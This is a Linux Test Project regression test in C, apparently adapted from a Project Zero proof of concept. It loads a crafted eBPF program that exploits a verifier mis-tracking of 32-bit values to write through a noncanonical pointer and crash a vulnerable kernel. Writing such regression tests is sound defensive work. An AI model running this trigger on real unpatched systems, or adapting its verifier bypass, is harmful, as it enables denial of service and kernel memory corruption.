/*
 * Copyright (c) 2017 Petr Vorel <pvorel@suse.cz>
 * Copyright (c) 2017,  <jannh@google.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
/*
 * Thanks to <jannh@google.com> for the original proof of concept:
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1454&desc=3
 */

#include "config.h"
#include "tst_test.h"

#ifdef HAVE_LINUX_BPF_H
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <sys/types.h>

#include "tst_safe_net.h"

/* start from kernel */
#define BPF_EMIT_CALL(FUNC)                 \
	((struct bpf_insn) {                    \
	 .code  = BPF_JMP | BPF_CALL,            \
	 .dst_reg = 0,                   \
	 .src_reg = 0,                   \
	 .off   = 0,                 \
	 .imm   = (FUNC) }) /* ??? */
#define BPF_MOV32_IMM(DST, IMM)                 \
	((struct bpf_insn) {                    \
	 .code  = BPF_ALU | BPF_MOV | BPF_K,     \
	 .dst_reg = DST,                 \
	 .src_reg = 0,                   \
	 .off   = 0,                 \
	 .imm   = IMM })
#define BPF_REG_ARG1    BPF_REG_1
#define BPF_REG_ARG2    BPF_REG_2
#define BPF_REG_ARG3    BPF_REG_3
#define BPF_REG_ARG4    BPF_REG_4
#define BPF_REG_ARG5    BPF_REG_5
#define BPF_PSEUDO_MAP_FD   1
#define BPF_LD_IMM64_RAW(DST, SRC, IMM)             \
	((struct bpf_insn) {                    \
	 .code  = BPF_LD | BPF_DW | BPF_IMM,     \
	 .dst_reg = DST,                 \
	 .src_reg = SRC,                 \
	 .off   = 0,                 \
	 .imm   = (__u32) (IMM) }),          \
	 ((struct bpf_insn) {                    \
	  .code  = 0, /* zero is reserved opcode */   \
	  .dst_reg = 0,                   \
	  .src_reg = 0,                   \
	  .off   = 0,                 \
	  .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_ALU32_IMM(OP, DST, IMM)             \
	((struct bpf_insn) {                    \
	 .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \
	 .dst_reg = DST,                 \
	 .src_reg = 0,                   \
	 .off   = 0,                 \
	 .imm   = IMM })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_ALU32_REG(OP, DST, SRC)             \
	((struct bpf_insn) {                    \
	 .code  = BPF_ALU | BPF_OP(OP) | BPF_X,      \
	 .dst_reg = DST,                 \
	 .src_reg = SRC,                 \
	 .off   = 0,                 \
	 .imm   = 0 })
#define BPF_EXIT_INSN()                     \
	((struct bpf_insn) {                    \
	 .code  = BPF_JMP | BPF_EXIT,            \
	 .dst_reg = 0,                   \
	 .src_reg = 0,                   \
	 .off   = 0,                 \
	 .imm   = 0 })
/* Memory store, *(uint *) (dst_reg + off16) = src_reg */
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \
	((struct bpf_insn) {                    \
	 .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \
	 .dst_reg = DST,                 \
	 .src_reg = SRC,                 \
	 .off   = OFF,                   \
	 .imm   = 0 })
#define BPF_REG_FP  BPF_REG_10
#define BPF_MOV64_REG(DST, SRC)                 \
	((struct bpf_insn) {                    \
	 .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
	 .dst_reg = DST,                 \
	 .src_reg = SRC,                 \
	 .off   = 0,                 \
	 .imm   = 0 })
#define BPF_ALU64_IMM(OP, DST, IMM)             \
	((struct bpf_insn) {                    \
	 .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
	 .dst_reg = DST,                 \
	 .src_reg = 0,                   \
	 .off   = 0,                 \
	 .imm   = IMM })
#define BPF_MOV64_REG(DST, SRC)                 \
	((struct bpf_insn) {                    \
	 .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
	 .dst_reg = DST,                 \
	 .src_reg = SRC,                 \
	 .off   = 0,                 \
	 .imm   = 0 })
#define BPF_REG_TMP BPF_REG_8
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \
	((struct bpf_insn) {                    \
	 .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \
	 .dst_reg = DST,                 \
	 .src_reg = SRC,                 \
	 .off   = OFF,                   \
	 .imm   = 0 })
#define BPF_JMP_IMM(OP, DST, IMM, OFF)              \
	((struct bpf_insn) {                    \
	 .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
	 .dst_reg = DST,                 \
	 .src_reg = 0,                   \
	 .off   = OFF,                   \
	 .imm   = IMM })
#define BPF_MOV64_IMM(DST, IMM)                 \
	((struct bpf_insn) {                    \
	 .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
	 .dst_reg = DST,                 \
	 .src_reg = 0,                   \
	 .off   = 0,                 \
	 .imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)             \
	((struct bpf_insn) {                    \
	 .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
	 .dst_reg = DST,                 \
	 .src_reg = SRC,                 \
	 .off   = 0,                 \
	 .imm   = 0 })
#define BPF_MOV32_REG(DST, SRC)                 \
	((struct bpf_insn) {                    \
	 .code  = BPF_ALU | BPF_MOV | BPF_X,     \
	 .dst_reg = DST,                 \
	 .src_reg = SRC,                 \
	 .off   = 0,                 \
	 .imm   = 0 })
/* end from kernel */

int bpf_(int cmd, union bpf_attr *attrs) {
	return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

void array_set(int mapfd, uint32_t key, uint32_t value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key    = (uint64_t)&key,
		.value  = (uint64_t)&value,
		.flags  = BPF_ANY,
	};


	int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
	if (res)
		tst_brk(TBROK | TERRNO, "map update elem");
}

static void run(void)
{
	tst_res(TINFO, "TEST");

	union bpf_attr create_map_attrs = {
		.map_type = BPF_MAP_TYPE_ARRAY,
		.key_size = 4,
		.value_size = 8,
		.max_entries = 16
	};
	int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
	if (mapfd == -1)
		tst_brk(TBROK | TERRNO, "map create");


	array_set(mapfd, 1, 1);

	char verifier_log[100000];
	struct bpf_insn insns[] = {
		BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),

		// fill r0 with pointer to map value
		BPF_MOV64_REG(BPF_REG_TMP, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_TMP, -4), // allocate 4 bytes stack
		BPF_MOV32_IMM(BPF_REG_ARG2, 1),
		BPF_STX_MEM(BPF_W, BPF_REG_TMP, BPF_REG_ARG2, 0),
		BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_TMP),
		BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
		BPF_MOV64_REG(BPF_REG_0, 0), // prepare exit
		BPF_EXIT_INSN(), // exit

		// r1 = 0xffff'ffff, mistreated as 0xffff'ffff'ffff'ffff
		BPF_MOV32_IMM(BPF_REG_1, 0xffffffff),
		// r1 = 0x1'0000'0000, mistreated as 0
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),
		// r1 = 0x1000'0000'0000'0000, mistreated as 0
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 28),

		// compute noncanonical pointer
		BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),

		// crash by writing to noncanonical pointer
		BPF_MOV32_IMM(BPF_REG_1, 0xdeadbeef),
		BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_1, 0),

		// terminate to make the verifier happy
		BPF_MOV32_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN()
	};
	union bpf_attr create_prog_attrs = {
		.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
		.insn_cnt = sizeof(insns) / sizeof(insns[0]),
		.insns = (uint64_t)insns,
		.license = (uint64_t)"",
		.log_level = 2,
		.log_size = sizeof(verifier_log),
		.log_buf = (uint64_t)verifier_log
	};
	int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
	if (progfd == -1)
		tst_res(TFAIL, "prog load %s!", verifier_log);
	tst_res(TINFO, "ok so far?");

	int socks[2];
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
		tst_brk(TBROK | TERRNO, "socketpair failed");
	SAFE_SETSOCKOPT(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int));
	SAFE_WRITE(0, socks[1], "a", 1);
	char c;
	SAFE_READ(0, socks[0], &c, 1);

	tst_res(TPASS, "We didn't crash");
}

static struct tst_test test = {
	.test_all = run,
	.min_kver = "4.9"
};
#else
TST_TEST_TCONF("test requires kernel headers");
#endif
